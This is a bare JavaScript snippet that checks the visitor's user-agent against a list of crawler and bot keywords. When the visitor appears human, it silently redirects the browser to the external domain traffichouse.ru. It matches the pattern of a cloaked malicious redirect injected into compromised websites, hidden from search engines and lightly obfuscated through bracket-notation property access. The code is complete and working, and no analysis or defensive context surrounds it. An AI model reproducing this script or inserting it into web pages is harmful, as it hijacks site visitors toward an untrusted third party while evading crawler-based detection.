var RUN = true;
var t = navigator['userAgent']['toLowerCase']();
var url = 'http://traffichouse.ru/?2';
var notAllow = ['http', 'craw', 'bot', 'surf', 'spid', 'tweet'];
var min = 25;
if (RUN) {
    locate(url, allow(t, notAllow, min))
};

function allow(a, b, c) {
    if (a['length'] < c) {
        return false
    };
    for (var d = 0; d < b['length']; d++) {
        if (a['indexOf'](b[d]) != -1) {
            return false
        }
    };
    return true
};

function locate(a, b) {
    if (b) {
        location['href'] = a
    }
};